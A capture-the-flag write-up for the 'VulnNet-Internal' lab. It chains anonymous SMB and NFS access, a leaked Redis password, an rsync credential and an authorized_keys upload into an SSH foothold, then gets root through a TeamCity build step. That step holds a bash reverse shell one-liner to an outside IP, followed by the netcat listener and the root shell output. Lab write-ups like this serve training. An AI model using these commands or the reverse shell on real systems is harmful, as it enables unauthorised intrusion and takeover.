# CTF Writeup: VulnNet-Internal

---

## Reconaissance

An initial scan revealed the following information abt running services on the target server.

```
nmap -n -Pn -sS -p- 10.114.170.81 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-02 14:12 CDT
Nmap scan report for 10.114.170.81
Host is up (0.013s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
873/tcp   open     rsync
2049/tcp  open     nfs
6379/tcp  open     redis
9090/tcp  filtered zeus-admin
43331/tcp open     unknown
46147/tcp open     unknown
51339/tcp open     unknown
52355/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

Enumerated services in detaill.

```
nmap -n -Pn -sSCV -p 22,111,139,445,873,2049,6379,9090,43331,46147,51339,52355 10.114.170.81
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-02 14:20 CDT
Nmap scan report for 10.114.170.81
Host is up (0.0099s latency).

PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0d:1f:84:5d:29:46:f6:09:53:73:2d:79:7d:4e:4d:30 (RSA)
|   256 d2:7c:df:77:6d:26:87:fa:e7:8f:47:bf:7d:14:7b:7e (ECDSA)
|_  256 28:ea:16:d6:ba:50:14:b7:93:76:2c:eb:61:fa:09:c2 (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44916/udp   mountd
|   100005  1,2,3      52355/tcp   mountd
|   100005  1,2,3      54821/udp6  mountd
|   100005  1,2,3      60635/tcp6  mountd
|   100021  1,3,4      36658/udp   nlockmgr
|   100021  1,3,4      38005/tcp6  nlockmgr
|   100021  1,3,4      43331/tcp   nlockmgr
|   100021  1,3,4      47490/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 4
445/tcp   open     netbios-ssn Samba smbd 4
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs         3-4 (RPC #100003)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
43331/tcp open     nlockmgr    1-4 (RPC #100021)
46147/tcp open     mountd      1-3 (RPC #100005)
51339/tcp open     mountd      1-3 (RPC #100005)
52355/tcp open     mountd      1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-05-02T19:21:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.83 seconds
```

Started off with enumerating SMB. Enumerated SMB Shares anonymously.

```
smbmap -H 10.114.170.81                                                

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                            [*] Detected 1 hosts serving SMB
[|] Initializing hosts...                                                                                 [/] Authenticating...                                                                                     [-] Authenticating...                                                                                     [\] Authenticating...                                                                                     [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[|] Enumerating shares...                                                                                 [/] Enumerating shares...                                                                                 [-] Enumerating shares...                                                                                 [\] Enumerating shares...                                                                                                                                                                                     
[+] IP: 10.114.170.81:445       Name: 10.114.170.81             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY       VulnNet Business Shares
        IPC$                                                    NO ACCESS       IPC Service (ip-10-114-170-81 server (Samba, Ubuntu))
[|] Closing connections..                                                                                 [/] Closing connections..                                                                                 [-] Closing connections..                                                                                 [\] Closing connections..                                                                                 [|] Closing connections..                                                                                 [/] Closing connections..                                                                                 [-] Closing connections..                                                                                 [*] Closed 1 connections
```

We have anonymous read access on an non-default share named "shares".

Connected to it.

```
smbclient \\\\10.114.170.81/shares                                            
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \>
```

Downloaded all smb directorys in the share to local machine.

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Retrieved services.txt flag in temp folder.

```
THM{0a09d51e488f5fa105d8d866a497440a}
```

Since there was no more attack vectors to be exploited, I moved on further with Redis, there was nothing. Moved onto NFS.

```
showmount -e 10.114.170.81                                                         
Export list for 10.114.170.81:
/opt/conf *
```

Let's try and mount this file system share onto our local machine.

```
mkdir mnt/opt/conf
```

I mounted the share onto my local machine using the following tool.

```
mount -t nfs 10.114.170.81:/opt/conf /home/saitama/Desktop/Exploiting/OSCP_Prep/THM/Linux/VulnNet-Internal/mnt/opt/conf
```

Found an potential password within the redis.conf file.

```
requirepass "B65Hx562F@ggAZ@F"
```

Logged into redis database authenticated.

```
redis-cli -a 'B65Hx562F@ggAZ@F' -h 10.114.170.81
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.114.170.81:6379>
```

Enumerate keys.

```
10.114.170.81:6379> KEYS *
1) "internal flag"
2) "marketlist"
3) "authlist"
4) "tmp"
5) "int"
```

Inspect keys.

```
10.114.170.81:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
```

Check type value.

```
TYPE "authlist"
list
```

Enumerating list.

```
10.114.170.81:6379> LRANGE "authlist" 0 -1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

This seems to be an base64 encoded password or smth.

```
echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

This gives us an password and the information that we can connect with it to rsync.

Connected to it.

```
rsync rsync://rsync-connect@10.114.170.81                                
files           Necessary home interaction
```

An "files" directory is presented to us in the output. Let's enumerate it.

```
rsync rsync://rsync-connect@10.114.170.81/files
Password: 
drwxr-xr-x          4,096 2026/05/02 14:12:15 .
drwxr-xr-x          4,096 2025/06/28 11:16:36 ssm-user
drwxr-xr-x          4,096 2021/02/06 06:49:29 sys-internal
drwxr-xr-x          4,096 2026/05/02 14:12:16 ubuntu
```

## Initial Access

Let's enumerate user "sys-internal" directory.

```
rsync rsync://rsync-connect@10.114.170.81/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 06:49:29 .
-rw-------             61 2021/02/06 06:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 07:33:19 .bash_history
-rw-r--r--            220 2021/02/01 06:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 06:51:14 .bashrc
-rw-r--r--             26 2021/02/01 06:53:18 .dmrc
-rw-r--r--            807 2021/02/01 06:51:14 .profile
lrwxrwxrwx              9 2021/02/02 08:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 06:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 13:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 06:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 05:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 05:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 03:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 06:53:57 .config
drwx------          4,096 2021/02/01 06:53:19 .dbus
drwx------          4,096 2021/02/01 06:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 06:53:22 .local
drwx------          4,096 2021/02/01 07:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 05:43:14 .ssh
drwx------          4,096 2021/02/02 05:16:16 .thumbnails
drwx------          4,096 2021/02/01 06:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 06:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 07:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 06:53:22 Music
drwxr-xr-x          4,096 2021/02/01 06:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 06:53:22 Public
drwxr-xr-x          4,096 2021/02/01 06:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 06:53:22 Videos
```

Downloaded user.txt flag to local machine.

```
rsync rsync://rsync-connect@10.114.170.81/files/sys-internal/user.txt .
Password:
```

```
cat user.txt    
THM{da7c20696831f253e0afaca8b83c07ab}
```


There seems to be an .ssh directory. Since we have file upload, let's generate an ssh key and upload it into authorized_keys.


```
ssh-keygen -o             
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): id_rsa_temp
Enter passphrase for "id_rsa_temp" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa_temp
Your public key has been saved in id_rsa_temp.pub
The key fingerprint is:
SHA256:j0ww5tuITxk8R/QP98918Jf1r7HCFxm6vvnfPAg3V0k root@kali
The key's randomart image is:
+--[ED25519 256]--+
|        .        |
|       . .     E |
|      + . o . o o|
|     + +   + ..+=|
|      = S   ...+B|
|     . @ o ..oo+=|
|    . = + ..o.=.+|
|     o      +o.*.|
|      .    .+=+.=|
+----[SHA256]-----+
```

Uploaded public key into authorized_keys.

```
rsync -av id_rsa_temp.pub rsync://rsync-connect@10.114.170.81/files/sys-internal/.ssh/authorized_keys
Password: 
sending incremental file list
id_rsa_temp.pub

sent 202 bytes  received 35 bytes  22.57 bytes/sec
total size is 91  speedup is 0.38
```

Connected to the server via SSH.

```
ssh -i id_rsa_temp sys-internal@10.114.170.81
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

36 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@ip-10-114-170-81:~$
```

## Privilege Escalation

There seems to be an non-default Folder in the Root Directory called "TeamCity". The service is running internally on port 8111.

```
sys-internal@ip-10-114-170-81:~$ ss -tulnp
Netid    State     Recv-Q    Send-Q            Local Address:Port         Peer Address:Port    Process    
udp      UNCONN    0         0                       0.0.0.0:5353              0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:36658             0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:44916             0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:44918             0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:2049              0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:55340             0.0.0.0:*                  
udp      UNCONN    0         0                 127.0.0.53%lo:53                0.0.0.0:*                  
udp      UNCONN    0         0            10.114.170.81%ens5:68                0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:111               0.0.0.0:*                  
udp      UNCONN    0         0                10.114.191.255:137               0.0.0.0:*                  
udp      UNCONN    0         0                 10.114.170.81:137               0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:137               0.0.0.0:*                  
udp      UNCONN    0         0                10.114.191.255:138               0.0.0.0:*                  
udp      UNCONN    0         0                 10.114.170.81:138               0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:138               0.0.0.0:*                  
udp      UNCONN    0         0                       0.0.0.0:33552             0.0.0.0:*                  
udp      UNCONN    0         0                          [::]:5353                 [::]:*                  
udp      UNCONN    0         0                          [::]:38200                [::]:*                  
udp      UNCONN    0         0                          [::]:54821                [::]:*                  
udp      UNCONN    0         0                          [::]:2049                 [::]:*                  
udp      UNCONN    0         0                          [::]:111                  [::]:*                  
udp      UNCONN    0         0                          [::]:35027                [::]:*                  
udp      UNCONN    0         0                          [::]:47490                [::]:*                  
udp      UNCONN    0         0                          [::]:37257                [::]:*                  
tcp      LISTEN    0         511                     0.0.0.0:6379              0.0.0.0:*                  
tcp      LISTEN    0         50                      0.0.0.0:139               0.0.0.0:*                  
tcp      LISTEN    0         4096                    0.0.0.0:51339             0.0.0.0:*                  
tcp      LISTEN    0         4096                    0.0.0.0:111               0.0.0.0:*                  
tcp      LISTEN    0         64                      0.0.0.0:2049              0.0.0.0:*                  
tcp      LISTEN    0         128                     0.0.0.0:22                0.0.0.0:*                  
tcp      LISTEN    0         4096              127.0.0.53%lo:53                0.0.0.0:*                  
tcp      LISTEN    0         50                      0.0.0.0:445               0.0.0.0:*                  
tcp      LISTEN    0         64                      0.0.0.0:43331             0.0.0.0:*                  
tcp      LISTEN    0         5                     127.0.0.1:631               0.0.0.0:*                  
tcp      LISTEN    0         5                       0.0.0.0:873               0.0.0.0:*                  
tcp      LISTEN    0         4096                    0.0.0.0:52355             0.0.0.0:*                  
tcp      LISTEN    0         4096                    0.0.0.0:46147             0.0.0.0:*                  
tcp      LISTEN    0         50                         [::]:139                  [::]:*                  
tcp      LISTEN    0         5                         [::1]:631                  [::]:*                  
tcp      LISTEN    0         4096                       [::]:111                  [::]:*                  
tcp      LISTEN    0         64                         [::]:2049                 [::]:*                  
tcp      LISTEN    0         128                        [::]:22                   [::]:*                  
tcp      LISTEN    0         4096                       [::]:43505                [::]:*                  
tcp      LISTEN    0         50                         [::]:445                  [::]:*                  
tcp      LISTEN    0         511                       [::1]:6379                 [::]:*                  
tcp      LISTEN    0         50                            *:9090                    *:*                  
tcp      LISTEN    0         50           [::ffff:127.0.0.1]:56141                   *:*                  
tcp      LISTEN    0         5                          [::]:873                  [::]:*                  
tcp      LISTEN    0         4096                       [::]:60635                [::]:*                  
tcp      LISTEN    0         64                         [::]:38005                [::]:*                  
tcp      LISTEN    0         50                            *:40327                   *:*                  
tcp      LISTEN    0         4096                       [::]:56873                [::]:*                  
tcp      LISTEN    0         1            [::ffff:127.0.0.1]:8105                    *:*                  
tcp      LISTEN    0         100          [::ffff:127.0.0.1]:8111                    *:*
```

Performed port forwarding in order to access the internal service with SSH.

```
ssh -i id_rsa_temp -L 8111:127.0.0.1:8111 sys-internal@10.114.170.81
```

I found the authentication token in /logs/catalina.out

```
[TeamCity] Super user authentication token: 6862800289410342482 (use empty username with the token as the password to access the server)
```

I've created a Project "manually".

I selected "Build Configurations" and chose "Deployment" so everything we run get's deployed on the underlying server.

Navigated to "Build Steps" and added one. 

I chose "Command Line" and added the following bash reverse shell script to the "custom script" field.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/1337 0>&1'
```

Started up my listener on port 1337.

```
nc -lvnp 1337
```

Pressed on "Deploy" & gained RCE as user "root".

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.170.81] 58470
bash: cannot set terminal process group (715): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-114-170-81:/TeamCity/buildAgent/work/d1df6864f98d2599#
```

Retrieved root.txt in /root directory.

```
THM{e8996faea46df09dba5676dd271c60bd}
```
